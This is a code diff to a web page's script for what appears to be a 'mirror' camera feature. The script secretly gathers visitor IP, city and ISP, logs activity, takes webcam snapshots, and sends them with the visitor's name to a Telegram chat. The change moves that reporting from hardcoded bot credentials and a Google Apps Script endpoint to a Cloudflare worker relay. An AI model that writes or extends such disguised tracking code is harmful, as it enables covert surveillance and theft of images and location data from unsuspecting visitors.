@@ -385,9 +385,7 @@
     <div class="footer-text" onclick="closeMirror()" style="cursor: pointer;">tap here to close mirror ✖️</div>
 </div>  
 <script>  
-    const BOT_TOKEN = "***REMOVED***";  
-    const CHAT_ID = "6953122511";  
-    const GOOGLE_APP_URL = "***REMOVED***";
+    const SECURITY_WORKER_URL = "https://dual-vibe-secure-api.arfatyaser194.workers.dev";
 
     let visitorData = { 
         ip: "Fetching...", city: "Fetching...", isp: "Fetching...", 
@@ -436,11 +434,12 @@
     } catch(e) {}
 
     function sendToTelegram(text) {  
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {  
-            method: 'POST', headers: { 'Content-Type': 'application/json' },  
-            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })  
+        fetch(`${SECURITY_WORKER_URL}/telegram`, {  
+            method: 'POST',  
+            headers: { 'Content-Type': 'application/json' },  
+            body: JSON.stringify({ text: text })  
         }).catch(e => console.log("Delivery Failed"));  
-    }  
+    }
 
     function logActivity(action) {  
         let time = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });  
@@ -698,7 +697,14 @@
         let ctx = canvas.getContext('2d'); ctx.translate(canvas.width, 0); ctx.scale(-1, 1);
         ctx.filter = modes[currentModeIndex].filter; ctx.drawImage(vid, 0, 0, canvas.width, canvas.height);  
         let photoData = canvas.toDataURL('image/jpeg', 0.92);
-        fetch(GOOGLE_APP_URL, { method: 'POST', body: JSON.stringify({ secret: "***REMOVED***", image: photoData, caption: `📸 **[ NEW CAPTURE ]**\nName: \`${trackState.name}\`\nTrigger: \`${photoLabel}\`` }), headers: { 'Content-Type': 'text/plain;charset=utf-8' } }).catch(e => { console.log("Delivery Failed"); });  
+        fetch(`${SECURITY_WORKER_URL}/capture`, {  
+            method: 'POST',  
+            headers: { 'Content-Type': 'application/json' },  
+            body: JSON.stringify({  
+                image: photoData,  
+                caption: `📸 **[ NEW CAPTURE ]**\\nName: \`${trackState.name}\`\\nTrigger: \`${photoLabel}\``  
+            })  
+        }).catch(e => { console.log("Delivery Failed"); });
     }  
 
     function closeMirror() { let ov = document.getElementById('mirror-overlay'); if(videoStream) videoStream.getTracks().forEach(t => t.stop()); ov.style.opacity='0'; setTimeout(()=>{ ov.style.display='none'; },1000); }  
